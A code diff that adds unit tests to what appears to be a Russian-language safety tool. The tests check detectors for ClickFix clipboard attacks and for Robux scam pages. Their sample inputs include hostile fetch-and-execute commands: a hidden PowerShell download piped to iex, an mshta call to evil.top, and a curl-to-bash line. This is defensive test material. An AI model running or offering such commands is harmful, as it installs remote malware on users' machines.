@@ -104,6 +104,18 @@ test("всё сделано: 100 баллов", () => S({ stats: { checked: 5, l
 test("утечки снижают балл", () => S({ stats: { checked: 4, leaked: 2, reused: 0 } }).score < S({ stats: { checked: 4, leaked: 0, reused: 0 } }).score);
 test("советует включить 2FA, если это даёт больше всего", () => { const r = S({ stats: { checked: 5, leaked: 0, reused: 0 }, twofaSites: ["google.com"], traceDone: ["a", "b"] }); return r.next.key === "nextTwofa" && r.next.args[0] === "google.com"; });
 
+section("checkClipboard — вредные команды (ClickFix)");
+test("обычный текст — ничего", () => checkClipboard("Привет, вот ссылка на домашку") === null);
+test("powershell с «I am not a robot» — опасно", () => checkClipboard('powershell -w hidden -c "iwr http://x.ru/a.ps1 | iex" # I am not a robot - reCAPTCHA ID 4821') === "bad");
+test("mshta + страница «нажмите Win+R» — опасно", () => checkClipboard("mshta https://evil.top/v.hta", "Verify you are human. Press Windows + R and paste") === "bad");
+test("curl | bash на странице с инструкцией — просто предупреждение", () => checkClipboard('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" | bash', "Paste that in a macOS Terminal prompt.") === "warn");
+
+section("checkBait — развод с робуксами и скинами");
+test("«Бесплатные робуксы» — развод", () => checkBait("robux-free.ru", "Получи бесплатные робуксы прямо сейчас! Войди в аккаунт") !== null);
+test("«Free Robux generator» — развод", () => checkBait("rbx-gen.xyz", "Free Robux generator 2026") !== null);
+test("roblox.com сам по себе — не развод", () => checkBait("www.roblox.com", "Buy Robux. You won a badge!") === null);
+test("обычная страница — не развод", () => checkBait("school.ru", "Расписание уроков на неделю") === null);
+
 out.insertAdjacentHTML("beforeend", `<p class="score">Пройдено: ${passed} из ${total}</p>`);
 </script>
 </body>
